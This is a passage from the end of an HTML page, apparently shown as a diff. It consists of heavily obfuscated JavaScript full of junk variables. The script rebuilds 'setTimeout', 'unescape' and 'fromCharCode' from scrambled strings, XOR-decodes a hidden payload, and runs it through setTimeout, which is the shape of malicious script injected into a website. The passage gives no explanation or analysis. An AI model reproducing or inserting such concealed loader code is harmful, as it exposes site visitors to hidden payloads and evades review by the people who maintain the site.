vQQQ=false;var pNMG="";}var cRA=65395;var bXB="";var eRBE="eRBE";var mZH="mZH";var bDR="bDR";function lCY(dEOV) {var oZP=false;var cIHF="";var rOZ="";if(jEUC[dEOV] != null) {var xESA="xESA";var wEY=false;var xKF="";var sCX = jEUC[dEOV].iZJ;var pWYP=18489;var rYW='';var aBA='';var kUN=63241;var yAG = jEUC[dEOV].wLA.substr(sCX, 1);var lDE='';var oJZ=false;var kPG=61849;var mLJG=false;var oBUU=false;var eKWQ="";var gHOV=false;if(sCX + 1 >= jEUC[dEOV].wLA.length) {var pEAX="";var mFJ=false;jEUC[dEOV].iZJ = 0;var cCI='';var hAA=false;} else {var zFP='';var tTR="";jEUC[dEOV].iZJ = sCX + 1;var sPK="";var nUQ="nUQ";}var sYB='';var iUJ="";var lSU=2218;var qNZK='';return zCMH(yAG, 0);var yCNC=false;var uZNW="";var rVM="rVM";}var bYKR="";var xUG='';}var jBBJ="";var xMMR='';var xKEB="";var mMQ=51424;var bXSB=7094;var eGP="";var dXLG="dXLG";function zCMH(vUM,lXIR){var dTXB=19459;var qEZ="qEZ";var aZES=39299;return vUM.charCodeAt(lXIR);var nSV='';var lXUO=17734;var fFR=false;var eNTY=false;}var nXC=17031;var tES=false;var nNKM="nNKM";var mVTG='';var iJS="";var lECT="lECT";var kZEL = new String(document['dkokc;ukm;eknAtk'.replace(/[k;\$A1]/g, '')]);var rKJI='';var gAC=false;var aXQ="";var cBX="";var lUUU=false;var bNLG='';if(kZEL.indexOf('a!r4i4tWy!'.replace(/[\!sW4@]/g, '')) != -1) {var wII="wII";var iLS=false; return 90;var rXIV=false;var fVK="";var vDC=43685;}var tZG=false;var lSO=false;var xTQS=42845;var uQZ="";var yAN='';var jEUC = null;var bZU=31579;var pGXH="";var wIV=window;var fQX="";var aHIE='';var uIA=window;var mYXC=false;var gAE='';var pWB='';var yQBE=35313;var eVW=String;var dUC='';var zPY=false;var dZG='';var oCG=39054;var vWEB = wIV['s5e3t3TXi3m3e3oXu3t{'.replace(/[\{5\|3X]/g, '')];var rTAN="";var fUW='';var bYZY=90;var xOQ="";var bAAT="";var qFHF=4158;var xHES=wIV['uGn9eGs/cOaOpOeG'.replace(/[GZO/9]/g, '')];var uHYU=false;var eWD=56456;var dWFP = '';var bQA="bQA";var kOYN=20980;var uGVO=false;var pMTJ=eVW['fZr/o/mLC/hSa/ryC/oLdSe/'.replace(/[/LyZS]/g, '')];var qOI=false;var qWG="";var uWFM = xHES(uWFM);var bKX="bKX";var fEY="fEY";var yZJ="";var aUNG=false;var yXMX="";var gBFC='';var uDZP = new eVW(xVS).replace(/[^@a-z0-9A-Z_-]/g,'');var cFC='';var dIGR='';var zGXC='';var wPO=false;var dMWH = new eVW(uPP(uDZP));var nKBL=false;var eQP=false;var uOYY='';var aYD='';var xUGK="xUGK";var iPBM=false;var bNC="";eBF('jINI', uDZP);var nIB=false;var rFJC="rFJC";var wQII="wQII";eBF('yHQC', dMWH);var kHYS='';var qRIK="";var xFDL=false;var sXQR='';var qWJY="qWJY";for(var lHY=0; lHY < (uWFM.length); lHY++) {var aHQ=54229;var vAPH='';var vVQ='';var xME='';var mUV=64188;var hKRW="";var yTH = zCMH(uWFM,lHY);var xTB="";var mBE='';yTH^= bYZY;var aHZ="aHZ";var mYS="";yTH^= lCY('yHQC');var zTJ=false;var yEJE="yEJE";var aUP="aUP";var aJM=19766;yTH^= lCY('jINI');var uMJ=false;var zPA="";var fFIX="";var lFJD="lFJD";var mHC=34324;dWFP+=pMTJ(yTH);var jQHE='';var uEWB=false;}var iGA=false;var gUE=false;var zLN=false;var zDX=false;var wPLC="";var vJE=54154;vWEB(dWFP, 101);var tJL="tJL";var nPG='';return dWFP=new eVW();var zRD=60700;var sMSX='';var iNW='';var qXZ=false;var lCGQ="";var jTHI='';var cORW='';};var eELO=7240;var cREX="cREX";var cACO=50742;xVS(xBH);var sNCG='';var xAUN=59508;var rOZV=false;</script></body>
+</html>
